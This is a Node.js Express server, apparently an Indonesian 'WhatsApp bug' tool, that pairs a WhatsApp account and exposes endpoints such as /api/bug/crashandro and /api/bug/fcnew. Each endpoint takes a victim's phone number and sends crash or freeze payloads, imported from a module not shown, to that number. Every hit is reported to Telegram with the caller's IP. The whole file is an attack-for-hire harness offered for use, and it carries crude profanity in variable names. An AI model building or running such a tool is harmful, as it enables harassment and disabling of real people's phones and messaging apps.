console.clear();
require('./public/settings/config')
console.log('starting...');
process.on("uncaughtException", console.error);

const {
default: makeWASocket, 
prepareWAMessageMedia, 
removeAuthState,
useMultiFileAuthState, 
DisconnectReason, 
fetchLatestBaileysVersion, 
makeInMemoryStore, 
generateWAMessageFromContent, 
generateWAMessageContent, 
generateWAMessage,
jidDecode, 
proto, 
delay,
relayWAMessage, 
getContentType, 
generateMessageTag,
getAggregateVotesInPollMessage, 
downloadContentFromMessage, 
fetchLatestWaWebVersion, 
InteractiveMessage, 
makeCacheableSignalKeyStore, 
Browsers, 
generateForwardMessageContent, 
MessageRetryMap 
} = require("@whiskeysockets/baileys");

const pino = require('pino');
const readline = require("readline");
const fs = require('fs');
const express = require("express");
const bodyParser = require('body-parser');
const cors = require("cors");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 5036

const { CrashAndro, MessageSQL, fcNew, MythFlow } = require('./public/service/bugs')
const { getRequest, sendTele } = require('./public/engine/telegram')

app.enable("trust proxy");
app.set("json spaces", 2);
app.use(cors());
app.use(express.urlencoded({ 
extended: true 
}));
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));
app.use(bodyParser.raw({ 
limit: '50mb', 
type: '*/*' 
}));

const { Boom } = require('@hapi/boom');
const usePairingCode = true;

const question = (text) => {
const rl = readline.createInterface({
input: process.stdin, 
output: process.stdout 
})
return new Promise((resolve) => {
rl.question(text, resolve) 
});
}

// ===== Pairing Endpoint =====
app.get("/api/pair", async (req, res) => {
try {
const number = req.query.number;
if (!number) return res.status(400).json({ status: false, message: "parameter 'number' diperlukan" });

const { state, saveCreds } = await useMultiFileAuthState("./session");
const { version } = await fetchLatestBaileysVersion();

client = makeWASocket({
logger: pino({ level: "silent" }),
printQRInTerminal: false,
browser: ["Vercel", "Chrome", "1.0.0"],
auth: state,
});

if (!client.authState.creds.registered) {
const code = await client.requestPairingCode(number, "AROGANZZ");
console.log(`Pairing code untuk ${number}: ${code}`);
res.json({ status: true, pairing_code: code });
} else {
res.json({ status: true, message: "Sudah terdaftar" });
}

client.ev.on("creds.update", saveCreds);
credsLoaded = true;
} catch (err) {
console.error(err);
res.status(500).json({ status: false, error: err.message });
}
});

// ======= STATUS ENDPOINT =======
app.get("/api/status", async (req, res) => {
res.json({
connected: clientReady,
credsLoaded,
});
});

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

app.get('/api/bug/crashandro', async (req, res) => {
const { target, fjids } = req.query;
if (!target) return res.status(400).json({
status: false, 
message: "parameter target diperlukan"
});
if (!fjids) return res.status(400).json({
status: false,
message: "parameter fjids diperlukan"
});
let bijipeler = target.replace(/[^0-9]/g, "")
if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!")

let cuki = bijipeler + '@s.whatsapp.net'
const info = await getRequest(req)
try {
await CrashAndro(target)
res.json({
status: true,
creator: global.creator,
result: "sukses"
});
console.log(`Successfully Send Bug To Number ${cuki}\n`)
const penis = `
┏━━━━━━━━━━━━━━━━━━━━━━
┃         A P I - H I T 
┣━━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ Endpoint: CrashAndro
┃ ⌬ Target : ${target}
┃ ⌬ IP: ${info.ip}
┃ ⌬ Method: ${info.method}
┃ ⌬ Waktu : ${info.timestamp}
┗━━━━━━━━━━━━━━━━━━━━━━`
sendTele(penis)
} catch (error) {
console.error(error);
res.status(500).json({
status: false,
error: error.message
});
}
});

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

app.get('/api/bug/messagesql', async (req, res) => {
const { target } = req.query;
if (!target) return res.status(400).json({
status: false,
message: "parameter target diperlukan"
});
let bijipeler = target.replace(/[^0-9]/g, "")
if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!")

let cuki = bijipeler + '@s.whatsapp.net'
const info = await getRequest(req)
try {
await MessageSQL(target)
res.json({
status: true,
creator: global.creator,
result: "sukses"
});
console.log(`Successfully Send Bug To Number ${cuki}\n`)
const penis = `
┏━━━━━━━━━━━━━━━━━━━━━━
┃         A P I - H I T 
┣━━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ Endpoint: MessageSqL
┃ ⌬ Target: ${target}
┃ ⌬ IP: ${info.ip}
┃ ⌬ Method: ${info.method}
┃ ⌬ Waktu : ${info.timestamp}
┗━━━━━━━━━━━━━━━━━━━━━━`
sendTele(penis)
} catch (error) {
console.error(error);
res.status(500).json({
status: false,
error: error.message
});
}
});

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

app.get('/api/bug/mythflow', async (req, res) => {
const { target, fjids } = req.query;
if (!target) return res.status(400).json({
status: false, 
message: "parameter target diperlukan"
});
if (!fjids) return res.status(400).json({
status: false,
message: "parameter fjids diperlukan"
});
let bijipeler = target.replace(/[^0-9]/g, "")
if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!")

let cuki = bijipeler + '@s.whatsapp.net'
const info = await getRequest(req)
try {
await MythFlow(target)
res.json({
status: true,
creator: global.creator,
result: "sukses"
});
console.log(`Successfully Send Bug To Number ${cuki}\n`)
const penis = `
┏━━━━━━━━━━━━━━━━━━━━━━
┃         A P I - H I T 
┣━━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ Endpoint: X-MythFlow
┃ ⌬ Target: ${target}
┃ ⌬ IP: ${info.ip}
┃ ⌬ Method: ${info.method}
┃ ⌬ Waktu : ${info.timestamp}
┗━━━━━━━━━━━━━━━━━━━━━━`
sendTele(penis)
} catch (error) {
console.error(error);
res.status(500).json({
status: false,
error: error.message
});
}
});

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

app.get('/api/bug/fcnew', async (req, res) => {
const { target } = req.query;
if (!target) return res.status(400).json({
status: false,
message: "parameter target diperlukan"
});
let bijipeler = target.replace(/[^0-9]/g, "")
if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!")

let cuki = bijipeler + '@s.whatsapp.net'
const info = await getRequest(req)
try {
await fcNew(target)
res.json({
status: true,
creator: global.creator,
result: "sukses"
});
console.log(`Successfully Send Bug To Number ${cuki}\n`)
const penis = `
┏━━━━━━━━━━━━━━━━━━━━━━
┃         A P I - H I T 
┣━━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ Endpoint: FreezeDraining
┃ ⌬ Target: ${target}
┃ ⌬ IP: ${info.ip}
┃ ⌬ Method: ${info.method}
┃ ⌬ Waktu : ${info.timestamp}
┗━━━━━━━━━━━━━━━━━━━━━━`
sendTele(penis)
} catch (error) {
console.error(error);
res.status(500).json({
status: false,
error: error.message
});
}
});
 
//~~~~~~~~~~~~~~~~~~~~~~~~~\\

client.ev.on('connection.update', (update) => {
const { konek } = require('./public/connection/connect')
konek({ 
client, 
update, 
clientstart,
DisconnectReason,
Boom
})
})

app.get('/', (req, res) => {
res.sendFile(path.join(__dirname, 'index.html'));
});

if (process.env.VERCEL) {
module.exports = app;
} else {
app.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
}

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
